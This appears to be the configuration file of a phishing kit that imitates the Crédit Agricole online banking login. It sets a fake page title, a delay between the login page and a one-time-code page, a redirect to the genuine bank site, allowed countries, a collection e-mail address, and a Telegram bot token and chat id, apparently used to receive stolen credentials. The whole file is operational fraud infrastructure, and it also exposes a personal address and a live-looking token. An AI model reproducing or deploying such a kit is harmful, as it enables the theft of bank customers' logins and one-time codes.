const config = {
  name: "AGR", // Provider Name
  mail: "stella.petto@gmail.com", // User E-mail
  subject: "RZ",
  timeout: 5000, // time out between login Page and OTP
  titlePage: "Accéder à mes comptes - Crédit Agricole", // Title header bar
  redirectTo: "https://www.credit-agricole.fr/",
  version: 3,
  branch: 3,
  allowCountry: ["FR", "CI"],
  telegramToken: "5325253703:AAHe9YPpbTl7HNlTTrcrpYuYZpBVDw_OeU4", // telegram token
  telegramId: "-660251832", // telegram id
};

window.config = config;
